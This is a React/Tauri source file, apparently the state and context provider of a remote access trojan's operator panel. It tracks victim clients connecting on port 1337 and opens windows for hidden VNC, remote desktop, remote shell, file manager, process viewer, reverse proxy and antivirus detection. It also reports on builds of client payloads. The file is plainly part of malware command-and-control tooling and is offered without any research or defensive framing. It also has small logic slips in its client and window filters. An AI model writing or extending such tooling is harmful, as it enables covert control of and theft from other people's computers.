import React, { useState, useEffect, useRef } from "react";
import { RATContext } from "./RATContext";
import { listen } from "@tauri-apps/api/event";
import toast from "react-hot-toast";
import {
  RATState,
  RATClient,
  RATProviderProps,
  ClientWindowType,
  Log,
} from "../../types";
import { fetchStateCmd } from "./RATCommands";
import { WebviewWindow } from "@tauri-apps/api/window";

const translateWindowType = (type: string) => {
  switch (type) {
    case "hvnc":
      return "HVNC";
    case "process-viewer":
      return "Process Viewer";
    case "remote-desktop":
      return "Remote Desktop";
    case "file-manager":
      return "File Manager";
    case "remote-shell":
      return "Remote Shell";
    case "reverse-proxy":
      return "Reverse Proxy";
    case "av-detection":
      return "Antivirus Detection";
    default:
      return type;
  }
};

const windowTypeSizes = {
  "reverse-proxy": {
    width: 920,
    height: 260,
  },
  "remote-desktop": {
    width: 1280,
    height: 720,
  },
  hvnc: {
    width: 1280,
    height: 720,
  },
  "file-manager": {
    width: 1280,
    height: 720,
  },
  "process-viewer": {
    width: 1280,
    height: 720,
  },
  "remote-shell": {
    width: 1280,
    height: 700,
  },
};

export const RATProvider: React.FC<RATProviderProps> = ({ children }) => {
  const [port, setPort] = useState<string>("1337");
  const [running, setRunning] = useState<boolean>(false);
  const [clientList, setClientList] = useState<RATClient[]>([]);
  const [notificationClient, setNotificationClient] = useState<boolean>(true);
  const notificationClientRef = useRef(false);
  const [listenClientNotif, setListenClientNotif] = useState<boolean>(false);
  const [selectedClient, setSelectedClient] = useState<string>("");
  const [clientWindows, setClientWindows] = useState<ClientWindowType[]>([]);
  const [serverLogs, setServerLogs] = useState<Log[]>([]);

  async function fetchState() {
    const state: RATState = await fetchStateCmd();
    const running = state.running;
    setRunning(running);
  }

  useEffect(() => {
    fetchState();
    if (!running) return;

    const stateInterval = setInterval(fetchState, 10000);

    return () => {
      clearInterval(stateInterval);
    };
  }, [running]);

  const customToast = (icon: string, toast_message: string, style: string) => {
    return toast(toast_message, {
      icon,
      className: `${style} text-lg`,
    });
  };

  const cleanupClientWindowByType = async (addr: string, type: string) => {
    Object.values(clientWindows).forEach((window) => {
      if (window.addr?.includes(addr) && window.type === type) {
        window.window.emit("close_window");
      }
    });

    setClientWindows((prevWindows) => {
      const newWindows = prevWindows.filter(
        (window) => window.addr !== addr && window.type !== type
      );
      return newWindows;
    });
  };

  const cleanupClientWindows = async (addr: string) => {
    setClientWindows((prevWindows) => {
      prevWindows.forEach((window) => {
        if (window.addr.includes(addr)) {
          window.window.emit("close_window");
        }
      });

      return prevWindows.filter((window) => window.addr !== addr);
    });
  };

  const openClientWindow = async (
    addr: string,
    type: string,
    clientFullName: string
  ) => {
    try {
      const fullUrl = `/${type}/${addr}`;

      const windowId = `${type}-${Date.now()}`;

      const window = new WebviewWindow(windowId, {
        url: fullUrl,
        title: `${translateWindowType(type)} - ${clientFullName} - ${addr}`,
        width: windowTypeSizes[type as keyof typeof windowTypeSizes].width,
        height: windowTypeSizes[type as keyof typeof windowTypeSizes].height,
        resizable: true,
        center: true,
      });

      let newWindow: ClientWindowType = { window, addr, type, id: windowId };

      setClientWindows((prevWindows) => [...prevWindows, newWindow]);

      window.once("tauri://close-requested", async () => {
        await cleanupClientWindowByType(addr, type);
      });

      return window;
    } catch (error) {
      console.error(`Failed to open ${type} window for client ${addr}:`, error);
    }
  };

  async function waitNotification(type: string) {
    listen(type, async (event) => {
      if (type == "client_connected" || type == "client_disconnected") {
        console.log(event.payload);
        console.log(type);
        const client = event.payload as RATClient;
        let icon = type == "client_connected" ? "🤙" : "👋";
        let message = type == "client_connected" ? "connected" : "disconnected";
        let style = "!bg-white !text-black !rounded-2xl !border-accentx";

        let toast_message = `Client ${client.username} has ${message}!`;

        if (type == "client_disconnected") {
          await cleanupClientWindows(client.addr);
        }

        if (type == "client_connected") {
          setClientList((prevClients) => [...prevClients, client]);
        }

        if (type == "client_disconnected") {
          setClientList((prevClients) =>
            prevClients.filter((client) => client.uuidv4 !== client.uuidv4)
          );
        }

        if (notificationClientRef.current)
          customToast(icon, toast_message, style);
      }
      if (type == "server_log") {
        const { event_type, message } = event.payload as Log;
        let log = { event_type, message, time: new Date().toLocaleString() };
        console.log(log);
        setServerLogs((prevLogs) => [log, ...prevLogs]);

        if (event_type == "server_error") {
          customToast(
            "❌",
            message,
            "!bg-white !text-black !rounded-2xl !border-accentx"
          );
        }

        if (event_type == "build_client") {
          customToast(
            "🔨",
            message,
            "!bg-white !text-black !rounded-2xl !border-accentx"
          );
        }

        if (event_type == "build_finished") {
          customToast(
            "🔨",
            message,
            "!bg-white !text-black !rounded-2xl !border-accentx"
          );
        }

        if (event_type == "build_failed") {
          customToast(
            "❌",
            message,
            "!bg-white !text-black !rounded-2xl !border-accentx"
          );
        }
      }
    });
  }

  useEffect(() => {
    if (!listenClientNotif) {
      setListenClientNotif(true);
      waitNotification("client_connected");
      waitNotification("client_disconnected");
      waitNotification("server_log");
    }
  }, [listenClientNotif]);

  useEffect(() => {
    notificationClientRef.current = notificationClient;
  }, [notificationClient]);

  const RATdata = {
    port,
    setPort,
    setRunning,
    running,
    clientList,
    setClientList,
    setSelectedClient,
    selectedClient,
    setNotificationClient,
    notificationClient,
    openClientWindow,
    serverLogs,
  };

  return <RATContext.Provider value={RATdata}>{children}</RATContext.Provider>;
};
